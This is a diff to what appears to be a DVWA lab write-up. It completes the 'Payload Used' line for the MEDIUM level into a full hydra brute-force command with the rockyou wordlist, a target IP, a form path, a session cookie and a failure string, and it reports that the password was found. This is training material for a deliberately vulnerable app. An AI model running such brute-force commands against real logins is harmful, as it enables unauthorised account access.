@@ -22,7 +22,7 @@ Higher security levels sanitize input before it reaches the database.
 
 ### MEDIUM
 **Payload Used:**  
-`hydra -l admin -P /usr/share/wordlists/rockyou.txt`
+`hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz 192.168.44.172 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=534uuj0t5702leo6gmot7b5c76;security=high:F=Username and/or password incorrect."`
 
 **Result:**  
 Correct password discovered through brute force.  
